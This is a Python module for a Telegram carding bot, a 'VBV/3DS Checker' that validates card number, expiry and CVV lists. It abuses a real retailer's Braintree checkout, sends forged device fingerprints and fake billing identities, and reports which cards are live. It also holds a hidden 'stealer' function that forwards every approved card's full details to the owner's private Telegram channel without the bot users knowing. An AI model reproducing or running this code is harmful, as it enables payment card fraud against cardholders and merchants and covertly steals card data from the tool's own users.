import time
import asyncio
import re
import json
import base64
import uuid
import random
import os
import requests
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

# ========== CONFIGURATION ==========
GATE_NAME = "VBV/3DS Checker"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# ========== STEALER CONFIG ==========
STEALER_CHANNEL_ID = -1003627495953
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    # Only send approved (success) or vbv_required hits
    if status not in ("Approved ✅", "OTP/3Ds 🔑"):
        return
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode=enums.ParseMode.HTML)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# ========== ORIGINAL BIN FETCH (antipublic.cc) ==========
def fetch_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "bin": data.get("bin", bin_number),
                "brand": data.get("brand", ""),
                "country_code": data.get("country", ""),
                "country_name": data.get("country_name", ""),
                "country_flag": data.get("country_flag", ""),
                "bank": data.get("bank", ""),
                "level": data.get("level", ""),
                "type": data.get("type", "")
            }
    except Exception:
        pass
    return None

def country_to_flag(country_code):
    if not country_code or len(country_code) != 2:
        return ""
    return chr(ord(country_code[0]) + 127397) + chr(ord(country_code[1]) + 127397)

# ========== HELPER CLASSES (preserved from original) ==========
class SimpleFaker:
    def __init__(self):
        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Donald", "Mark"]
        self.last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris"]
        self.streets = ["Main St", "High St", "Broadway", "2nd Ave", "Park Rd", "Oak St", "Pine St", "Maple Ave", "Cedar Ln", "Elm St", "Washington Blvd", "Lakeview Dr"]
        self.cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
        self.states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA", "FL", "OH", "NJ", "GA", "NC"]

    def first_name(self): return random.choice(self.first_names)
    def last_name(self): return random.choice(self.last_names)
    def street_address(self): return f"{random.randint(100, 9999)} {random.choice(self.streets)}"
    def city(self): return random.choice(self.cities)
    def state_abbr(self): return random.choice(self.states)
    def zip_code(self): return f"{random.randint(10000, 99999)}"
    def phone_number(self): return f"({random.randint(200, 999)}) {random.randint(100, 999)}-{random.randint(1000, 9999)}"

class VbvChecker:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.digidirect.com.au"
        self.braintree_graphql_url = "https://payments.braintree-api.com/graphql"
        self.cardinal_url = "https://geoissuer.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData"
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        self.session.headers.update({"User-Agent": self.user_agent})
        self.faker = SimpleFaker()

    def check_card(self, card_line):
        parts = card_line.split("|")
        if len(parts) < 4:
            return {"status": "error", "message": "Format Error", "card": card_line}
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(mes) == 1: mes = f"0{mes}"
        if len(ano) == 2: ano = f"20{ano}"

        start_time = time.time()
        bin_info = fetch_bin_info(cc[:6])

        try:
            client_token_data = self.get_braintree_token()
            if not client_token_data:
                return {"status": "error", "message": "Failed to get token", "card": f"{cc}|{mes}|{ano}|{cvv}"}

            session_b3 = self.generate_b3_session_id()
            tokenize_session_id = str(uuid.uuid4())
            token = self.tokenize_card(cc, mes, ano, cvv, client_token_data['auth_fingerprint'], tokenize_session_id)
            if not token:
                return {"status": "error", "message": "Tokenization failed", "card": f"{cc}|{mes}|{ano}|{cvv}"}

            hostname = "www.digidirect.com.au"
            cardinal_payload = self.generate_dynamic_fingerprint(hostname)
            self.send_cardinal_data(cardinal_payload)
            df_reference_id = f"0_{uuid.uuid4()}"

            lookup_result = self.lookup_3ds(
                cc=cc, mes=mes, ano=ano, token=token,
                auth_fingerprint=client_token_data['auth_fingerprint'],
                merchant_id=client_token_data['merchant_id'],
                df_reference_id=df_reference_id,
                session_id=session_b3,
                hostname=hostname,
                cvv=cvv,
                bin_info=bin_info
            )
            lookup_result["response_time"] = round(time.time() - start_time, 1)
            return lookup_result
        except Exception as e:
            return {"status": "error", "message": f"Exception: {e}", "card": f"{cc}|{mes}|{ano}|{cvv}", "response_time": round(time.time() - start_time, 1)}

    def get_braintree_token(self):
        try:
            self.session.cookies.clear()
            payload = {"query": "mutation createBraintreeClientToken { createBraintreeClientToken }"}
            headers = {"Accept": "application/json", "Origin": self.base_url, "Content-Type": "application/json"}
            response = self.session.post(f"{self.base_url}/graphql", json=payload, headers=headers, timeout=30)
            data = response.json()
            token = data.get("data", {}).get("createBraintreeClientToken")
            if token:
                return self.decode_token(token)
            return None
        except:
            return None

    def decode_token(self, token):
        try:
            if token.startswith("ey"):
                padding = len(token) % 4
                if padding: token += '=' * (4 - padding)
                decoded = base64.b64decode(token).decode('utf-8')
                data = json.loads(decoded)
                fingerprint = data.get("authorizationFingerprint")
                merchant_id = data.get("merchantId")
                if fingerprint:
                    return {"client_token": token, "auth_fingerprint": fingerprint, "merchant_id": merchant_id}
            return None
        except:
            return None

    def tokenize_card(self, cc, mm, yy, cvv, auth_token, session_id):
        query = """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard { bin brandCode last4 expirationMonth expirationYear }
                }
            }
        """
        payload = {
            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": session_id},
            "query": query,
            "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard"
        }
        headers = {"Authorization": f"Bearer {auth_token}", "Braintree-Version": "2018-05-10", "Accept": "application/json", "Content-Type": "application/json"}
        try:
            response = self.session.post(self.braintree_graphql_url, json=payload, headers=headers, timeout=30)
            data = response.json()
            return data.get("data", {}).get("tokenizeCreditCard", {}).get("token")
        except:
            return None

    def lookup_3ds(self, cc, mes, ano, token, auth_fingerprint, merchant_id, df_reference_id, session_id, hostname, cvv, bin_info):
        billing = {
            "billingLine1": self.faker.street_address(),
            "billingCity": self.faker.city(),
            "billingState": self.faker.state_abbr(),
            "billingPostalCode": self.faker.zip_code(),
            "billingCountryCode": "US",
            "billingGivenName": self.faker.first_name(),
            "billingSurname": self.faker.last_name(),
            "billingPhoneNumber": self.faker.phone_number()
        }
        client_metadata = {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.94.0",
            "cardinalDeviceDataCollectionTimeElapsed": random.randint(700, 800),
            "issuerDeviceDataCollectionTimeElapsed": random.randint(5000, 5100),
            "issuerDeviceDataCollectionResult": True
        }
        meta_obj = {"merchantAppId": hostname, "platform": "web", "sdkVersion": "3.94.0", "source": "client", "integration": "custom", "integrationType": "custom", "sessionId": session_id}
        payload = {
            "amount": 1,
            "additionalInfo": billing,
            "challengeRequested": True,
            "bin": cc[:6],
            "dfReferenceId": df_reference_id,
            "clientMetadata": client_metadata,
            "authorizationFingerprint": auth_fingerprint,
            "braintreeLibraryVersion": "braintree/web/3.94.0",
            "_meta": meta_obj,
            "browserColorDepth": 24,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserScreenHeight": 688,
            "browserScreenWidth": 756,
            "browserTimeZone": -480,
            "deviceChannel": "Browser"
        }
        url = f"https://api.braintreegateway.com/merchants/{merchant_id}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
        headers = {"Authorization": f"Bearer {auth_fingerprint}", "Braintree-Version": "2018-05-10", "Accept": "application/json", "Content-Type": "application/json"}
        try:
            response = self.session.post(url, json=payload, headers=headers, timeout=30)
            json_resp = response.json()
        except:
            return {"status": "error", "message": "Invalid JSON", "card": f"{cc}|{mes}|{ano}|{cvv}"}

        if "error" in json_resp:
            return {"status": "error", "message": json_resp["error"].get("message", "Unknown Error"), "card": f"{cc}|{mes}|{ano}|{cvv}"}

        payment_method = json_resp.get("paymentMethod")
        three_ds_info = payment_method.get("threeDSecureInfo") if payment_method else json_resp.get("threeDSecureInfo")
        status = three_ds_info.get("status") if three_ds_info else json_resp.get("status")
        if not status:
            return {"status": "error", "message": "Empty Status", "card": f"{cc}|{mes}|{ano}|{cvv}"}

        status_lower = status.lower()
        if status_lower in ["authenticate_successful", "successful", "authenticate_attempt_successful"]:
            final_status = "success"
        elif status_lower == "challenge_required":
            final_status = "vbv_required"
        elif status_lower == "authenticate_rejected":
            final_status = "authenticate_rejected"
        else:
            final_status = status_lower

        # Extract BIN data from response or from provided bin_info
        bank_name = ""
        country_code = ""
        brand = ""
        card_type = ""
        level = ""
        country_name = ""
        country_flag = ""
        if bin_info:
            bank_name = bin_info.get("bank", "")
            country_code = bin_info.get("country_code", "")
            brand = bin_info.get("brand", "")
            card_type = bin_info.get("type", "")
            level = bin_info.get("level", "")
            country_name = bin_info.get("country_name", "")
            country_flag = bin_info.get("country_flag", "")
        else:
            # Fallback: try to get from binData in response
            bin_data = None
            if payment_method and "binData" in payment_method:
                bin_data = payment_method["binData"]
            elif "binData" in json_resp:
                bin_data = json_resp["binData"]
            if bin_data:
                bank_name = bin_data.get("issuingBank", "")
                country_code = bin_data.get("countryOfIssuance", "")
                brand = bin_data.get("brand") or bin_data.get("brandCode", "")
                card_type = bin_data.get("product", "")
                if country_code:
                    country_name = country_code.upper()
                    country_flag = country_to_flag(country_code)

        return {
            "card": f"{cc}|{mes}|{ano}|{cvv}",
            "status": final_status,
            "message": status,
            "bank": bank_name,
            "country_code": country_code,
            "country_name": country_name,
            "country_flag": country_flag,
            "brand": brand,
            "card_type": card_type,
            "level": level,
            "response_time": 0
        }

    def generate_dynamic_fingerprint(self, hostname):
        ref_id = f"0_{uuid.uuid4()}"
        screen = {"FakedResolution": False, "Ratio": 1.7777777777777777, "Resolution": "1920x1080", "UsableResolution": "1920x1080", "CCAScreenSize": "02"}
        extended = {
            "Browser": {"Adblock": False, "AvailableJsFonts": [], "DoNotTrack": "unknown", "JavaEnabled": False},
            "Device": {"ColorDepth": 24, "Cpu": "unknown", "Platform": "Win32", "TouchSupport": {"MaxTouchPoints": 0, "OnTouchStartAvailable": False, "TouchEventCreationSuccessful": False}}
        }
        plugins_str = json.dumps([
            "bVSRIEK::TsWq89999HqdOmyCJECgQIECgYz4cOu::~a05",
            "ZrVxgvfu::IMtePPuXTw3bNtePHDBfXq0iZUpzhQIM::~4k5",
            "JavaScript doc Viewer::Portable Document Format::application/x-google-chrome-pdf~pdf",
            "OpenSource doc Viewer::::application/pdf~pdf"
        ])
        return {
            "Cookies": {"Legacy": True, "LocalStorage": True, "SessionStorage": True},
            "DeviceChannel": "Browser",
            "Extended": extended,
            "Fingerprint": self.generate_random_alphanumeric(32),
            "FingerprintingTime": random.randint(100, 300),
            "FingerprintDetails": {"Version": "1.5.1"},
            "Language": "en-US",
            "OrgUnitId": self.generate_random_alphanumeric(24),
            "Origin": "Songbird",
            "Plugins": plugins_str,
            "ReferenceId": ref_id,
            "Referrer": f"https://{hostname}/",
            "Screen": screen,
            "CallSignEnabled": None,
            "ThreatMetrixEnabled": False,
            "ThreatMetrixEventType": "PAYMENT",
            "ThreatMetrixAlias": "Default",
            "TimeOffset": -480,
            "UserAgent": self.user_agent,
            "UserAgentDetails": {"FakedOS": False, "FakedBrowser": False},
            "BinSessionId": str(uuid.uuid4())
        }

    def send_cardinal_data(self, payload):
        try:
            self.session.post(self.cardinal_url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        except:
            pass

    def generate_random_alphanumeric(self, length):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return "".join(random.choice(chars) for _ in range(length))

    def generate_b3_session_id(self):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        def rand(l): return "".join(random.choice(chars) for _ in range(l))
        return f"{rand(8)}-{rand(4)}-{rand(4)}-{rand(4)}-{rand(12)}"

def vbv_check_sync(card_line):
    checker = VbvChecker()
    return checker.check_card(card_line)

async def vbv_check_async(fullcc):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, vbv_check_sync, fullcc)

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# ========== SINGLE CHECK /vbv ==========
@Client.on_message(filters.command("vbv", [".", "/"]))
async def vbv_single(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            await message.reply_text(
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /vbv cc|mm|yy|cvv",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        # Animation step 1
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        # Step 2
        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        result = await vbv_check_async(fullcc)
        elapsed = time.perf_counter() - start

        # Step 3 (full squares)
        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdchk = await client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        # Map status to display and message
        status_str = result.get("status", "error")
        api_message = result.get("message", "No response")
        if status_str == "success":
            display_status = "Approved ✅"
            send_to_stealer = True
        elif status_str == "vbv_required":
            display_status = "OTP/3Ds 🔑"
            send_to_stealer = True
        elif status_str == "authenticate_rejected":
            display_status = "Declined ❌"
            send_to_stealer = False
        else:
            display_status = "Declined ❌"
            send_to_stealer = False

        # Get BIN info from result or fallback to get_bin_details
        bin_data = {
            "brand": result.get("brand", ""),
            "type": result.get("card_type", ""),
            "level": result.get("level", ""),
            "bank": result.get("bank", ""),
            "country": result.get("country_name", ""),
            "country_code": result.get("country_code", ""),
            "flag": result.get("country_flag", "")
        }
        if not bin_data["brand"] or not bin_data["bank"]:
            # Fallback to local get_bin_details
            bin_info_local = await get_bin_details(cc)
            if bin_info_local and len(bin_info_local) >= 6:
                bin_data["brand"] = bin_info_local[0] or bin_data["brand"]
                bin_data["type"] = bin_info_local[1] or bin_data["type"]
                bin_data["level"] = bin_info_local[2] or bin_data["level"]
                bin_data["bank"] = bin_info_local[3] or bin_data["bank"]
                bin_data["country"] = bin_info_local[4] or bin_data["country"]
                bin_data["flag"] = bin_info_local[5] or bin_data["flag"]

        # Build final message
        final_text = f"""<b>{display_status}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {bin_data['brand']}_{bin_data['type']}-{bin_data['level']}
{SYMBOL} 𝗕ᴀɴᴋ: {bin_data['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {bin_data['country']} {bin_data['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await client.edit_message_text(message.chat.id, thirdchk.id, final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)

        if send_to_stealer:
            await send_hit_to_stealer(client, fullcc, display_status, api_message, GATE_NAME, elapsed, first_name, role)

        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== MASS CHECK /mvbv ==========
@Client.on_message(filters.command("mvbv", [".", "/"]))
async def vbv_mass(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id, parse_mode=enums.ParseMode.HTML)
            return
        ccs = getcc[1]

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_vbv(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== TXT FILE CHECK /tvbv ==========
@Client.on_message(filters.command("tvbv", [".", "/"]))
async def vbv_txt(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target = None
        if message.reply_to_message and message.reply_to_message.document:
            target = message.reply_to_message
        elif message.document:
            target = message

        if not target or not target.document.file_name.endswith(".txt"):
            await message.reply_text(
                f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return

        file_path = await client.download_media(target)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_vbv(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== SEQUENTIAL PROCESSING ==========
async def process_sequential_vbv(client, message, ccs, user_id, first_name, role):
    total = len(ccs)
    approved_count = 0
    declined_count = 0
    start_time = time.perf_counter()
    approved_cards = []

    progress_msg = await message.reply(
        f"VBV/3DS Checker\n\n"
        f"{SYMBOL} Progress: 0/{total}\n"
        f"Approved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
        f"Checked by: {first_name} ({role})",
        quote=True, parse_mode=enums.ParseMode.HTML
    )

    for idx, fullcc in enumerate(ccs, 1):
        result = await vbv_check_async(fullcc)

        status_str = result.get("status", "error")
        api_message = result.get("message", "No response")
        if status_str == "success":
            display_status = "Approved ✅"
            send_to_stealer = True
        elif status_str == "vbv_required":
            display_status = "OTP/3Ds 🔑"
            send_to_stealer = True
        elif status_str == "authenticate_rejected":
            display_status = "Declined ❌"
            send_to_stealer = False
        else:
            display_status = "Declined ❌"
            send_to_stealer = False

        # Get BIN info
        bin_data = {
            "brand": result.get("brand", ""),
            "type": result.get("card_type", ""),
            "level": result.get("level", ""),
            "bank": result.get("bank", ""),
            "country": result.get("country_name", ""),
            "country_code": result.get("country_code", ""),
            "flag": result.get("country_flag", "")
        }
        if not bin_data["brand"] or not bin_data["bank"]:
            cc_num = fullcc.split('|')[0]
            bin_info_local = await get_bin_details(cc_num)
            if bin_info_local and len(bin_info_local) >= 6:
                bin_data["brand"] = bin_info_local[0] or bin_data["brand"]
                bin_data["type"] = bin_info_local[1] or bin_data["type"]
                bin_data["level"] = bin_info_local[2] or bin_data["level"]
                bin_data["bank"] = bin_info_local[3] or bin_data["bank"]
                bin_data["country"] = bin_info_local[4] or bin_data["country"]
                bin_data["flag"] = bin_info_local[5] or bin_data["flag"]

        if send_to_stealer:
            approved_count += 1
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": display_status,
                "response": api_message,
                "brand": f"{bin_data['brand']}_{bin_data['type']}-{bin_data['level']}",
                "bank": bin_data["bank"],
                "country": bin_data["country"],
                "flag": bin_data["flag"],
                "time": card_time
            })
            await send_hit_to_stealer(client, fullcc, display_status, api_message, GATE_NAME, card_time, first_name, role)
        else:
            declined_count += 1

        remaining = total - idx
        await progress_msg.edit_text(
            f"VBV/3DS Checker\n\n"
            f"{SYMBOL} Progress: {idx}/{total}\n"
            f"Approved ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
            f"Checked by: {first_name} ({role})",
            parse_mode=enums.ParseMode.HTML
        )
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        approved_msg = f"""<b>{card['status']}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})\n\n━━━━━━━━━━━━━━━━━━━━\n"
        for card in declined_list[:15]:
            decl_text += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            decl_text += f"\n... and {declined_count - 15} more declined cards"
        decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
        await message.reply_text(decl_text, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
            f"👤 Checked by: {first_name} ({role})",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
    await massdeductcredit(user_id, total)
